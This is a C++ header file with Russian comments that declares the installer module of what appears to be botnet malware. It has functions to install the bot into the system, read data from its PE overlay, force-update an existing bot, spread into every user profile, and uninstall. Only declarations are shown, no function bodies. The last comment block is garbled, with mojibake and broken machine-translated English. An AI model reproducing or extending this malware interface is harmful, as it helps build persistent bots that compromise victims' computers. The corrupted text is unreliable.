/*
  Инсталятор бота.
*/
#pragma once

#include "..\common\botstatus.h"

namespace CoreInstall
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Установка бота в систему.

    IN pathHome  - домашняя директория. Не должна кончаться на слеш.
    OUT coreFile - имя нвого установленого файла.

    Return       - true - в случаи успеха,
                   false - в случаи ошибки.

    После выполенния функция самостоятельно заполнит coreData.peSettings.
  */
  bool _install(const LPWSTR pathHome, LPWSTR coreFile);

  /*
    Загружкает данные созданные инсталлятором, в настоящее время заполняет и проверяет coreData.peSettings.

    IN ovelay      - оверлей с данными.
    IN overlaySize - размер оверлея.
    
    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _loadInstalledData(const void *overlay, DWORD overlaySize);

  /*
    Запуск обналвения.

    IN bs        - данные о сущевтующем боте.
    IN pathHome  - домашняя директория. Не должна кончаться на слеш.
    OUT coreFile - имя нового установленого файла.
    IN force     - форсировать обновления, не завимо от версий.

    Return       - true - в случаи успеха,
                   false - в случаи ошибки.

    После выполенния функция самостоятельно заполнит coreData.peSettings.
  */
  bool _update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR coreFile, bool force);
  
  /*
    Заполенние буфера, данными необходимыми для обновления этого бота.

    OUT bs - буфер.
  */
  void _loadUpdateData(BotStatus::VER1 *bs);

  /*
    Установка бота во все сущетвющие профили.  
    
    Return  - true - в случаи успеха,
              false - в случаи ошибки.
  */
  bool _installToAll(void);

  /*В В В В Removing a bot from the current profile.
В В В В 
В В В В IN wait - true - expect to complete the services
В В В В В В В В В В В В В В false - do not expect zavereshniya services.
В В В В 
В В В В Return - true - if successful,
В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _uninstall(bool wait);
};
